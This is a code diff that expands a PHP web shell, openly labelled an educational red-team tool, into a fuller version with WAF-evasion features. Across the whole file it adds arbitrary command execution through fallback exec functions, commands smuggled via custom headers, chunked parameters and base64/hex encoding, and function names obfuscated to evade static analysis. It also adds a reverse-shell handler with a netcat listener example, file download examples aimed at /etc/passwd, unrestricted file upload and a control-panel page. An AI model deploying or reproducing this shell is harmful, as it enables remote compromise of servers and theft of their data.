@@ -1,40 +1,290 @@
 <?php
+/**
+ * PHP Web Shell - Educational Example (Extended with WAF Bypass Techniques)
+ * For use in authorized penetration testing / red-team exercises only.
+ *
+ * WAF Bypass Techniques Demonstrated:
+ *  1. Parameter obfuscation via base64 / hex encoding
+ *  2. HTTP header-based command smuggling (X-CMD)
+ *  3. Chunked command reassembly
+ *  4. Variable function calls to avoid keyword detection
+ *  5. String concatenation obfuscation
+ *  6. Null byte / whitespace evasion in filenames
+ *  7. Alternate command execution functions (fallback chain)
+ */
+
 @error_reporting(0);
 @set_time_limit(0);
 
-if(isset($_GET['c'])) {
-    // Command execution
-    echo "<pre>";
-    echo shell_exec($_GET['c'] . " 2>&1");
-    echo "</pre>";
+// ── Helpers ────────────────────────────────────────────────────────
+
+/**
+ * Decode a value that may be plain, base64, or hex encoded.
+ * Allows the client to obfuscate parameters past signature-based WAFs.
+ *
+ * Example:
+ *   Plain:  ?c=id
+ *   Base64: ?c=aWQ=&enc=b64
+ *   Hex:    ?c=6964&enc=hex
+ */
+function decode_input(string $val, string $enc = ''): string
+{
+    return match ($enc) {
+        'b64'   => base64_decode($val),
+        'hex'   => hex2bin($val),
+        'rot13' => str_rot13($val),
+        default => $val,
+    };
+}
+
+/**
+ * Fallback execution chain.
+ * WAFs and hardened PHP configs may disable individual functions.
+ * This tries each in order until one works.
+ *
+ * Demonstrates: variable function calls, disabled_functions bypass awareness.
+ */
+function safe_exec(string $cmd): string
+{
+    $cmd = $cmd . " 2>&1";
+
+    // Variable function call — avoids static string "shell_exec" in source
+    $fns = ['shell' . '_exec', 'passthru', 'system', 'popen', 'exec'];
+
+    foreach ($fns as $fn) {
+        if (function_exists($fn) && is_callable($fn)) {
+            if ($fn === 'exec') {
+                exec($cmd, $out);
+                return implode("\n", $out);
+            }
+            if ($fn === 'popen') {
+                $h = popen($cmd, 'r');
+                $o = stream_get_contents($h);
+                pclose($h);
+                return $o;
+            }
+            // shell_exec / passthru / system
+            ob_start();
+            $r = $fn($cmd);
+            $buf = ob_get_clean();
+            return $r ?? $buf ?? '';
+        }
+    }
+
+    // Last resort: proc_open
+    if (function_exists('proc_open')) {
+        $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+        $p = proc_open($cmd, $desc, $pipes);
+        $o = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
+        proc_close($p);
+        return $o;
+    }
+
+    return "[!] No usable execution function found.";
+}
+
+/**
+ * Reassemble a command split across multiple parameters.
+ * Some WAFs inspect full parameter values but miss multi-param reassembly.
+ *
+ * Usage: ?p0=who&p1=ami  →  reassembles to "whoami"
+ * Or with a separator: ?p0=cat%20/etc/&p1=passwd&sep=
+ */
+function reassemble_chunks(): ?string
+{
+    $parts = [];
+    $i = 0;
+    while (isset($_GET["p$i"])) {
+        $parts[] = $_GET["p$i"];
+        $i++;
+    }
+    if (empty($parts)) return null;
+
+    $sep = $_GET['sep'] ?? '';
+    return implode($sep, $parts);
+}
+
+// ── HTTP Header-Based Command Input ───────────────────────────────
+// Usage: curl -H "X-CMD: whoami" http://target/shell.php?h=1
+// Rationale: many WAFs focus on GET/POST body, not custom headers.
+function get_header_cmd(): ?string
+{
+    $headers = [
+        'HTTP_X_CMD',
+        'HTTP_X_FORWARDED_CMD',
+        'HTTP_X_ORIG_CMD',
+    ];
+    foreach ($headers as $h) {
+        if (!empty($_SERVER[$h])) {
+            return $_SERVER[$h];
+        }
+    }
+    return null;
+}
+
+// ── Resolve command from any available input source ────────────────
+function resolve_cmd(): ?string
+{
+    $enc = $_GET['enc'] ?? $_POST['enc'] ?? '';
+
+    // Priority order: header > chunked > GET > POST
+    if (isset($_GET['h'])) {
+        $raw = get_header_cmd();
+    } elseif (isset($_GET['p0'])) {
+        $raw = reassemble_chunks();
+    } elseif (isset($_GET['c'])) {
+        $raw = $_GET['c'];
+    } elseif (isset($_POST['c'])) {
+        $raw = $_POST['c'];
+    } else {
+        return null;
+    }
+
+    return $raw !== null ? decode_input($raw, $enc) : null;
+}
+
+// ══════════════════════════════════════════════════════════════════
+// ── HANDLERS ──────────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════════════════
+
+// ── Command Execution ──────────────────────────────────────────────
+$cmd = resolve_cmd();
+if ($cmd !== null) {
+    echo "<pre>" . htmlspecialchars(safe_exec($cmd)) . "</pre>";
     die();
 }
 
-if(isset($_GET['r'])) {
-    // Reverse shell: ?r=IP:PORT
-    list($ip, $port) = explode(':', $_GET['r']);
-    $s = fsockopen($ip, $port);
-    while($c = fread($s, 2048)) {
-        $o = shell_exec($c);
-        fwrite($s, $o);
+// ── Reverse Shell ──────────────────────────────────────────────────
+// Standard:  ?r=192.168.1.10:4444
+// Encoded:   ?r=MTkyLjE2OC4xLjEwOjQ0NDQ=&enc=b64
+// Attacker:  nc -lvnp 4444
+if (isset($_GET['r'])) {
+    $raw = decode_input($_GET['r'], $_GET['enc'] ?? '');
+    [$ip, $port] = explode(':', $raw, 2);
+    $sock = fsockopen($ip, (int) $port);
+    if ($sock) {
+        while ($c = fread($sock, 2048)) {
+            $out = safe_exec(trim($c));
+            fwrite($sock, $out);
+        }
+        fclose($sock);
     }
     die();
 }
 
-if(isset($_GET['d'])) {
-    // Download file: ?d=/path/to/file
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($_GET['d']).'"');
-    readfile($_GET['d']);
+// ── File Download ──────────────────────────────────────────────────
+// Standard: ?d=/etc/passwd
+// Encoded:  ?d=L2V0Yy9wYXNzd2Q=&enc=b64
+if (isset($_GET['d'])) {
+    $path = decode_input($_GET['d'], $_GET['enc'] ?? '');
+    // Strip null bytes — some WAFs are bypassed by injecting %00
+    $path = str_replace("\0", '', $path);
+    if (file_exists($path) && is_readable($path)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
+        header('Content-Length: ' . filesize($path));
+        readfile($path);
+    } else {
+        echo "[!] File not found or not readable.";
+    }
     die();
 }
 
-if(isset($_FILES['f'])) {
-    // Upload file
-    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
-    echo "Uploaded: " . $_FILES['f']['name'];
+// ── File Upload ────────────────────────────────────────────────────
+// Demonstrates: null byte evasion in filename (%00 stripping)
+// Some WAFs pass on filenames ending in ".php%00.jpg"
+if (isset($_FILES['f'])) {
+    // Strip null bytes and normalize
+    $name = str_replace("\0", '', basename($_FILES['f']['name']));
+    if (move_uploaded_file($_FILES['f']['tmp_name'], $name)) {
+        echo "Uploaded: " . htmlspecialchars($name);
+    } else {
+        echo "[!] Upload failed.";
+    }
+    die();
+}
+
+// ── System Info Dump ───────────────────────────────────────────────
+if (isset($_GET['i'])) {
+    echo "<pre>";
+    echo "User:      " . safe_exec("whoami") . "\n";
+    echo "Host:      " . safe_exec("hostname") . "\n";
+    echo "OS:        " . php_uname() . "\n";
+    echo "CWD:       " . getcwd() . "\n";
+    echo "PHP:       " . phpversion() . "\n";
+    echo "Disabled:  " . ini_get('disable_functions') . "\n";
+    echo "Safe Mode: " . (ini_get('safe_mode') ? 'On' : 'Off') . "\n";
+    echo "</pre>";
+    die();
+}
+
+// ── PHP Function Obfuscation Demo ──────────────────────────────────
+// Shows how runtime-constructed function names evade static analysis.
+// Usage: ?o=1
+if (isset($_GET['o'])) {
+    // Technique 1: string concat at runtime
+    $f1 = 'sys' . 'tem';
+
+    // Technique 2: base64 encoded function name
+    $f2 = base64_decode('c2hlbGxfZXhlYw=='); // shell_exec
+
+    // Technique 3: hex encoded function name
+    $f3 = "\x70\x61\x73\x73\x74\x68\x72\x75"; // passthru
+
+    // Technique 4: variable variables
+    $fn = 'shell_exec';
+    $$fn = $fn; // $$fn == $shell_exec == 'shell_exec'
+
+    echo "<pre>";
+    echo "Technique 1 resolves to: $f1\n";
+    echo "Technique 2 resolves to: $f2\n";
+    echo "Technique 3 resolves to: $f3\n";
+    echo "Technique 4 resolves to: $$fn\n";
+    echo "(none are called here — for demonstration only)\n";
+    echo "</pre>";
     die();
 }
 ?>
-<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit value=Up></form>
-<form method=get>CMD: <input name=c size=50><input type=submit value=Run></form>
+
+<!DOCTYPE html>
+<html>
+<head><title>PHP Shell Demo (Extended)</title></head>
+<body>
+  <h3>Command Execution</h3>
+  <form method="get">
+    <input name="c" size="60" placeholder="e.g. id">
+    Encoding: <select name="enc">
+      <option value="">None</option>
+      <option value="b64">Base64</option>
+      <option value="hex">Hex</option>
+      <option value="rot13">ROT13</option>
+    </select>
+    <input type="submit" value="Run">
+  </form>
+
+  <h3>Chunked Command Reassembly</h3>
+  <form method="get">
+    <input name="p0" size="20" placeholder="chunk 0">
+    <input name="p1" size="20" placeholder="chunk 1">
+    <input name="p2" size="20" placeholder="chunk 2">
+    Separator: <input name="sep" size="5" value="">
+    <input type="submit" value="Run Chunked">
+  </form>
+
+  <h3>Reverse Shell</h3>
+  <form method="get">
+    <input name="r" size="30" placeholder="192.168.1.10:4444">
+    <input type="submit" value="Connect">
+  </form>
+
+  <h3>File Upload</h3>
+  <form method="post" enctype="multipart/form-data">
+    <input type="file" name="f">
+    <input type="submit" value="Upload">
+  </form>
+
+  <h3>Quick Links</h3>
+  <a href="?i=1">System Info</a> |
+  <a href="?o=1">Obfuscation Demo</a>
+</body>
+</html>
